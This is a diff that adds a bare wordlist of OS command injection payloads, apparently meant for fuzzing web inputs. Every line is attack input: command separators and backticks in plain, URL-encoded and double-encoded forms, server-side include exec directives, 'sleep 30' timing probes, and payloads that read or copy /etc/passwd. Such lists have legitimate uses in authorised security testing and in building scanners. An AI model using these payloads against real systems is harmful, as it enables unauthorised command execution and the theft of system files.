@@ -1,0 +1,55 @@
+test
+id
+cat /etc/passwd
+echo gaw4f4sdaf12f
+;id
+;cat /etc/passwd
+;echo gaw4f4sdaf12f
+%3Becho gaw4f4sdaf12f
+%253Becho gaw4f4sdaf12f
+|echo gaw4f4sdaf12f
+%7Cecho gaw4f4sdaf12f
+%257Cecho gaw4f4sdaf12f
+||echo gaw4f4sdaf12f
+%7C%7Cecho gaw4f4sdaf12f
+%257C%257Cecho gaw4f4sdaf12f
+&echo gaw4f4sdaf12f
+%26echo gaw4f4sdaf12f
+%2526echo gaw4f4sdaf12f
+&&echo gaw4f4sdaf12f
+%26%26echo gaw4f4sdaf12f
+%2526%2526echo gaw4f4sdaf12f
+`echo gaw4f4sdaf12f`
+%60echo gaw4f4sdaf12f%60
+%2560echo gaw4f4sdaf12f%2560
+<!--#exec cmd="echo gaw4f4sdaf12f" -->
+<!--#exec cmd="sleep 30" -->
+;$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+|$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+||$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+&&$(cat /etc/passwd) > gaw4f4sdaf12f.txt
+;cat /etc/passwd > gaw4f4sdaf12f.txt
+|cat /etc/passwd > gaw4f4sdaf12f.txt
+||cat /etc/passwd > gaw4f4sdaf12f.txt
+&cat /etc/passwd > gaw4f4sdaf12f.txt
+&&cat /etc/passwd > gaw4f4sdaf12f.txt
+`cat /etc/passwd > gaw4f4sdaf12f.txt`
+;sleep 30
+%3Bsleep 30
+%253Bsleep 30
+|sleep 30
+%7Csleep 30
+%257Csleep 30
+||sleep 30
+%7C%7Csleep 30
+%257C%257Csleep 30
+&sleep 30
+%26sleep 30
+%2526sleep 30
+&&sleep 30
+%26%26sleep 30
+%2526%2526sleep 30
+`sleep 30`
+%60sleep 30%60
+%2560sleep 30%2560
